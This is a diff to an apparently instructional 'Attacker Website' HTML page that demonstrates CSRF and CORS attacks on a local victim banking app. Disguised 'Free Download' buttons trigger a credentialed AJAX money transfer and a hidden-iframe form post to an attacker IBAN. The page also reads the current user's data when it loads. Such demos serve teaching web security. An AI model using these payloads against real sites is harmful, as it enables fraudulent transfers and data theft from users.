@@ -11,7 +11,7 @@
 <h2 style="color: red">Attacker Website</h2>
 
 <div style="border:2px solid green">
-    <h4 style="color: red">Transfer Money (via AJAX, CORS)</h4>
+    <h4 style="color: red">Transfer Money (via AJAX) --- CORS - XSS: Cross Site Scripting</h4>
     <input type="button" value="Download Free Stuff" onclick="transferAmount()">
 </div>
 
@@ -19,11 +19,13 @@
 <script type="text/javascript">
 
 
-    var restEndpoint =  "http://localhost:8080/victim";
+
 
     function transferAmount() {
-        $.ajax(restEndpoint +"/transfer-rest", {
+        $.ajax({
+            url:"http://localhost:8080/victim/transfer-rest",
             method: "POST",
+            xhrFields: { withCredentials: true }, // CORS sending credentials
             data: JSON.stringify({
                 recipientFullName:"Attacker",
                 recipientIban:"ATACKERIBAN013213",
@@ -35,17 +37,33 @@
             }
         });
     }
+
+    $.ajax("http://localhost:8080/rest/user/current", {
+        method: "GET",
+        success: function(trainings) {
+            toastr.success("data:  " + trainings)
+        }
+    });
 </script>
 
 <br/>
+<iframe  style="display: none" id="hiddenIframe" name="hiddenIframe"></iframe>
 <div style="border:2px solid red">
-    <h4 style="color:red;">Transfer Money (via FORM POST, XSRF)</h4>
-    <form method="post" action="http://localhost:8080/victim/transfer-form">
+    <h4 style="color:red;">Transfer Money (via FORM POST) --- CSRF: Cross Site Request Forging</h4>
+    <form method="post" action="http://localhost:8080/victim/transfer-form" target="hiddenIframe">
         <input type="hidden" name="recipientFullName" value="Attacker" />
         <input type="hidden" name="recipientIban" value="ATTACKERIBAN13123" />
         <input type="hidden" name="amount" value="100" />
         <input type="submit" value="Free Download!">
     </form>
 </div>
+
+<a href="http://localhost:8080/rest/user/current" target="hack">poza cu pisica</a>
+<!--<a href="http://localhost:8080/transfer?toIban=2423423423" target="hack">poza cu pisica</a>-->
+<iframe id="hack" name="hack"></iframe>
+<script>
+    // hack.content.innerHTML; // nu poti s afaci asta daca iframeul e incarcat de pe alt domain
+
+</script>
 </body>
 </html>
